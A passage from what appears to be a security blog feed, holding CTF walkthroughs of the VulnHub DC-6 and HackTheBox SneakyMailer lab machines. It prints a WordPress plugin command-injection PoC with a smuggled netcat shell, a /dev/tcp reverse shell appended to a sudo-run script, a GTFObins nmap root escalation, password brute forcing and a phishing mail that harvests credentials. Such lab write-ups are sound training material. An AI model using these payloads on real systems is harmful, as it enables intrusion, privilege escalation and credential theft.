MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Sat Apr 10 01:42:04 2021 -- 1 IP address (1 host up) scanned in 15.00 second</span>
</code></pre></div><p>From the results above, there&rsquo;s a redirection to <code>http://wordy/</code> on port 80. To properly resolve the web, I&rsquo;ll add wordy to my <code>/etc/hosts</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">192.168.1.104   wordy
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page clearly states that it&rsquo;s a WordPress site.</p>
<p><img class="img-container" src="imgs/image-20210419191210177.png" alt="image-20210419191210177"  />
</p>
<p>Nothing interesting to explore, but the text <code>secure plugins</code> seems to be a hint from the machine&rsquo;s author.</p>
<p>I ran a <code>gobuster</code> scan but found nothing useful.</p>
<h4 id="nmap-nse">Nmap NSE</h4>
<p><code>nmap</code> script scan found some usernames.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ nmap -p <span class="m">80</span> --script <span class="s2">&#34;http-wordpress*&#34;</span> wordy
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-11 23:13 EDT
Nmap scan report <span class="k">for</span> wordy <span class="o">(</span>192.168.2.104<span class="o">)</span>
Host is up <span class="o">(</span>0.00069s latency<span class="o">)</span>.

PORT   STATE SERVICE
80/tcp open  http
...
<span class="p">|</span>   /: WordPress version: 5.1.1
...
<span class="p">|</span> http-wordpress-users: 
<span class="p">|</span> Username found: admin
<span class="p">|</span> Username found: graham
<span class="p">|</span> Username found: mark
<span class="p">|</span> Username found: sarah
<span class="p">|</span> Username found: jens
<span class="p">|</span>_Search stopped at ID <span class="c1">#25. Increase the upper limit if necessary with &#39;http-wordpress-users.limit&#39;</span>
MAC Address: 08:00:27:AC:DB:5F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.48 seconds
</code></pre></div><h4 id="wpscan">WPScan</h4>
<p><code>wpscan</code> identifies two vulnerable WP plugins: an RCE and a user role privilege escalation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --enumerate vp --api-token token123 --plugins-detection aggressive
...
<span class="o">[</span>+<span class="o">]</span> plainview-activity-monitor
 <span class="p">|</span> Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 <span class="p">|</span> Last Updated: 2018-08-26T15:08:00.000Z
 <span class="p">|</span> Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is <span class="m">20180826</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Directory listing is enabled
 <span class="p">|</span>
 <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: <span class="m">200</span>
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: Plainview Activity Monitor &lt;<span class="o">=</span> <span class="m">20161228</span> - Remote Command Execution <span class="o">(</span>RCE<span class="o">)</span>
 <span class="p">|</span>     Fixed in: <span class="m">20180826</span>
 <span class="p">|</span>     References:
 <span class="p">|</span>      - https://wpscan.com/vulnerability/ab749b6c-c405-40e0-8417-0fe1bdb8537c
 <span class="p">|</span>      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2018-15877
 <span class="p">|</span>      - https://plugins.trac.wordpress.org/changeset/1930493/plainview-activity-monitor
 <span class="p">|</span>      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_plainview_activity_monitor_rce/
 <span class="p">|</span>
 <span class="p">|</span> Version: <span class="m">20161228</span> <span class="o">(</span>50% confidence<span class="o">)</span>
 <span class="p">|</span> Found By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

<span class="o">[</span>+<span class="o">]</span> user-role-editor
 <span class="p">|</span> Location: http://wordy/wp-content/plugins/user-role-editor/
 <span class="p">|</span> Last Updated: 2021-04-05T02:38:00.000Z
 <span class="p">|</span> Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> The version is out of date, the latest version is 4.59
 <span class="p">|</span>
 <span class="p">|</span> Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/, status: <span class="m">200</span>
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> <span class="m">1</span> vulnerability identified:
 <span class="p">|</span>
 <span class="p">|</span> <span class="o">[</span>!<span class="o">]</span> Title: User Role Editor &lt;<span class="o">=</span> 4.24 - Privilege Escalation
 <span class="p">|</span>     Fixed in: 4.25
 <span class="p">|</span>     References:
 <span class="p">|</span>      - https://wpscan.com/vulnerability/85e595f5-9f04-4799-9a09-c6675071b12c
 <span class="p">|</span>      - https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/
 <span class="p">|</span>
 <span class="p">|</span> Version: 4.24 <span class="o">(</span>80% confidence<span class="o">)</span>
 <span class="p">|</span> Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  - http://wordy/wp-content/plugins/user-role-editor/readme.txt
...
</code></pre></div><p>I&rsquo;m interested with the RCE one, but before that I&rsquo;ll have to find creds.</p>
<h4 id="brute-forcing-passwords">Brute-forcing passwords</h4>
<p>At that time, I was stuck for a couple of hours. Asking for a nudge and the answer was to brute force, I didn&rsquo;t know that the box&rsquo;s author actually gave us a hint to create a custom wordlist from <code>rokyou.txt</code>.</p>
<p><img class="img-container" src="imgs/image-20210419183629054.png" alt="image-20210419183629054"  />
</p>
<p>I&rsquo;ll create new wordlist from <code>rockyou.txt</code> and then use it to perform a brute force using <code>wpscan</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «dc-6» «192.168.43.234» 
$ cat /usr/share/wordlists/rockyou.txt <span class="p">|</span> grep k01 &gt; passwords.txt
→ root@iamf «dc-6» «192.168.43.234» 
$ wpscan --url http://wordy/ --usernames users --passwords passwords.txt 
</code></pre></div><p>It returns one valid credentials: <code>mark:helpdesk10</code>.</p>
<p><img class="img-container" src="imgs/image-20210419184715108.png" alt="image-20210419184715108"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="wp-dashboard">WP Dashboard</h4>
<p>With the credentials I obtained, I can login into the admin panel.</p>
<p><img class="img-container" src="imgs/image-20210531002724008.png" alt="image-20210531002724008"  />
</p>
<h4 id="plainview-activity-monitor---rce--cve-2018-15877">Plainview Activity Monitor - RCE  (CVE-2018-15877)</h4>
<p>From the previous <code>wpscan</code>, I searched the exploit PoC for Plainview Activity Monitor RCE and found this from <a href="https://www.exploit-db.com/exploits/45274">exploit-db</a>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
  <span class="c">&lt;!--  Wordpress Plainview Activity Monitor RCE
</span><span class="c">        [+] Version: 20161228 and possibly prior
</span><span class="c">        [+] Description: Combine OS Commanding and CSRF to get reverse shell
</span><span class="c">        [+] Author: LydA(c)ric LEFEBVRE
</span><span class="c">        [+] CVE-ID: CVE-2018-15877
</span><span class="c">        [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell
</span><span class="c">        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
</span><span class="c">  --&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;ip&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&#34;</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;lookup&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Lookup&#34;</span> <span class="p">/&gt;</span>
      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit request&#34;</span> <span class="p">/&gt;</span>
    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>The vulnerability comes from this IP tools feature.</p>
<p><img class="img-container" src="imgs/image-20210419194814055.png" alt="image-20210419194814055"  />
</p>
<p>I&rsquo;ll hit the lookup button and intercept the request on Burp.</p>
<p>RCE can be achieved by adding a set of malicious OS commands after the command pipe <code>|</code>, semi colon <code>;</code> (stacked command), or logical OR <code>||</code> at the <code>ip</code> section. In this case, I send a reverse shell.</p>
<p>Here is with command pipe.</p>
<p><img class="img-container" src="imgs/image-20210419194314291.png" alt="image-20210419194314291"  />
</p>
<p>And this one by stacking commands with semicolon.</p>
<p><img class="img-container" src="imgs/image-20210419200042885.png" alt="image-20210419200042885"  />
</p>
<p>I can not find the plugin&rsquo;s source code, my best guess it can be something like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">...</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]</span>
<span class="nv">$do_something</span> <span class="o">=</span> <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;dig </span><span class="si">$ip</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="o">...</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-graham">Shell as graham</h3>
<h4 id="internal-enumeration">Internal enumeration</h4>
<p>The home directory is readable by <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ find /home 2&gt;/dev/null
find /home 2&gt;/dev/null
...
/home/jens/backups.sh
....
/home/mark/stuff/things-to-do.txt
....
</code></pre></div><p>I immediately checked the contents of <code>backups.sh</code> and <code>things-to-do.txt</code>.</p>
<p>The <code>backups.sh</code> script is writable by group <code>devs</code>, and I&rsquo;ll note that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">www-data@dc-6:/var/www/html/wp-admin$ ls -l /home/jens/backups.sh
ls -l /home/jens/backups.sh
-rwxrwxr-x <span class="m">1</span> jens devs <span class="m">50</span> Apr <span class="m">26</span>  <span class="m">2019</span> /home/jens/backups.sh
www-data@dc-6:/var/www/html/wp-admin$ cat /home/jens/backups.sh
cat /home/jens/backups.sh
<span class="c1">#!/bin/bash</span>
tar -czf backups.tar.gz /var/www/html
</code></pre></div><p>And this <code>things-to-do.txt</code> contains graham&rsquo;s credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">www-data@dc-6:/var/www/html/wp-admin$ cat /home/mark/stuff/things-to-do.txt
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah&#39;s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah&#39;s replacement
</code></pre></div><h4 id="ssh---graham">SSH - graham</h4>
<p>I tried the graham&rsquo;s creds, <code>graham:GSo7isUM1D4</code>, on SSH, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">→ root@iamf «dc-6» «192.168.43.234» 
$ ssh graham@192.168.2.104
graham@192.168.2.104&#39;s password: 
Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
graham@dc-6:~$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)
</code></pre></div><h3 id="shell-as-jens">Shell as jens</h3>
<h4 id="sudo-privileges---backupssh">Sudo privileges - backups.sh</h4>
<p>User <code>graham</code> has sudo privileges on the <code>backups.sh</code> script, and this allows me to run the script as user <code>jens</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
graham@dc-6:~$ cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ ls -l /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
</code></pre></div><p>Because the script is also writable by graham (<code>devs</code> group), I can exploit this to escalate myself to <code>jens</code> by adding a reverse shell line to the script and then run it with sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">graham@dc-6:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.108/9000 0&gt;&amp;1&#39;</span> &gt;&gt; /home/jens/backups.sh
</code></pre></div><p><img class="img-container" src="imgs/image-20210419204321872.png" alt="image-20210419204321872"  />
</p>
<h3 id="shell-as--root">Shell as  root</h3>
<h4 id="sudo-privileges---nmap">Sudo privileges - nmap</h4>
<p>I found out that user <code>jens</code> is allowed to execute <code>nmap</code> as root user.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> jens on dc-6:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User jens may run the following commands on dc-6:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/nmap
</code></pre></div><p>I&rsquo;ll also exploit this using reference from <a href="https://gtfobins.github.io/gtfobins/nmap/">GTFObins</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">jens@dc-6:/home/graham$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
jens@dc-6:/home/graham$ <span class="nb">echo</span> <span class="s1">&#39;os.execute(&#34;/bin/sh&#34;)&#39;</span> &gt; <span class="nv">$TF</span>
jens@dc-6:/home/graham$ sudo nmap --script<span class="o">=</span><span class="nv">$TF</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210419204616406.png" alt="image-20210419204616406"  />
</p>
<p>And here is the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">root@dc-6:~# cat theflag.txt 


Yb        dP 888888 88     88         8888b.   dP&#34;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&#34;&#34;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&#34;&#34;   `&#34;&#39; 
   YP  YP    888888 88ood8 88ood8     8888Y&#34;   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
<li><a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
      <description>You&amp;#39;ve got mail!</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Exploiting sudo privileges on pip3</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp   open  smtp     Postfix smtpd
<span class="p">|</span>_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
<span class="p">|</span>_http-server-header: nginx/1.14.2
<span class="p">|</span>_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
<span class="p">|</span>_imap-capabilities: ENABLE STARTTLS <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
<span class="p">|</span> Not valid before: 2020-05-14T17:14:21
<span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
993/tcp  open  ssl/imap Courier Imapd <span class="o">(</span>released 2018<span class="o">)</span>
<span class="p">|</span>_imap-capabilities: ENABLE <span class="nv">AUTH</span><span class="o">=</span>PLAIN CHILDREN ACL <span class="nv">ACL2</span><span class="o">=</span>UNION <span class="nv">THREAD</span><span class="o">=</span>ORDEREDSUBJECT <span class="nv">THREAD</span><span class="o">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY <span class="nv">UTF8</span><span class="o">=</span>ACCEPTA0001 NAMESPACE
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Courier Mail Server/stateOrProvinceName<span class="o">=</span>NY/countryName<span class="o">=</span>US
<span class="p">|</span> Subject Alternative Name: email:postmaster@example.com
<span class="p">|</span> Not valid before: 2020-05-14T17:14:21
<span class="p">|</span>_Not valid after:  2021-05-14T17:14:21
<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
8080/tcp open  http     nginx 1.14.2
<span class="p">|</span>_http-open-proxy: Proxy might be redirecting requests
<span class="p">|</span>_http-server-header: nginx/1.14.2
<span class="p">|</span>_http-title: Welcome to nginx!
Service Info: Host:  debian<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ cat team <span class="p">|</span> egrep -o <span class="s2">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> <span class="p">|</span> tr -d <span class="s2">&#34;&lt;&gt;&#34;</span> <span class="p">|</span> tee emails.list
</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ swaks --server <span class="s1">&#39;10.10.10.197&#39;</span> --to <span class="sb">`</span>cat emails.list <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span><span class="sb">`</span> --from admin@sneakymailer.htb --body <span class="s2">&#34;http://10.10.14.42/&#34;</span>
</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
<p>The request body contains this data.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
<p>I lost some screenshots after the step above, but here is the final configuration.</p>
<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
